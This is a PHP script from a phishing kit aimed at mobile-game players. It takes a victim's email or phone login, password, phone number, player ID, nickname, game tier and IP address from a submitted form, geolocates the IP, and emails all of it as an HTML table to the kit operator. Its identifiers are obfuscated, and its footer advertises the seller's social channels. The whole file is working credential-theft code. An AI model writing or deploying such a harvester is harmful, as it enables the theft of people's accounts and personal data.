<?php
include'ngBackend/ngControllers.php';
if(isset($_POST['user'])){
$ᨃ = new ᕦ();
$user = $ᨃ->頁($_POST['user']);
$pass = $ᨃ->頁($_POST['pass']);
$id = $ᨃ->頁($_POST['id']);
$nick = $ᨃ->頁($_POST['nick']);
$hp = $ᨃ->頁($_POST['hp']);
$level = $ᨃ->頁($_POST['level']);
$tier = $ᨃ->頁($_POST['tier']);
$ep = $ᨃ->頁($_POST['ep']);
$ip = $ᨃ->頁($_POST['ip']);

$ngFlag = $ᨃ->計($ip);
$date = date('l, d-m-Y h:i:s');

$ᨀ = '-=[ '.$ngFlag['flag'].' '.$ngFlag['code'].' | LVL '.$level.' | '.$nick.' ]=-';
$ᨂ = '
<center>
 <div style="background: url(https://i.ibb.co/dKzXyrp/coollogo-com-101334325.png) no-repeat;border:2px solid pink;background-size: 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telepon</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nomor HP</th>
<th style="width: 65%; text-align: center;"><b>'.$hp.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ID</th>
<th style="width: 65%; text-align: center;"><b>'.$id.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nickname</th>
<th style="width: 65%; text-align: center;"><b>'.$nick.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Elite Pass</th>
<th style="width: 65%; text-align: center;"><b>'.$ep.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Tier</th>
<th style="width: 65%; text-align: center;"><b>'.$tier.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date</th>
<th style="width: 65%; text-align: center;"><b>'.$date.'</th> 
</tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3b5998;" href="https://www.facebook.com/nguyenxwann">Facebook</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="http://t.me/nguyenxstore">Telegram</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://chat.whatsapp.com/J1Cb9CGCfMRHuqhVqEt3dC">Whatsapp</a>
</div>
 <center>
';
include'email.php';
$ᨄ = 'From: ⭑⦙ Ng Script ⦙⭑<genjirambo@gmail.com>';
$ᨅ  = 'MIME-Version: 1.0' . "\r\n";
$ᨅ .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$ᨅ .= ''.$ᨄ.'' . "\r\n";
$ᨃ::mail($ᨁ,$ᨅ,$ᨂ,$ᨀ);
echo 'true';
}else{
header('location:index.html');
}
?>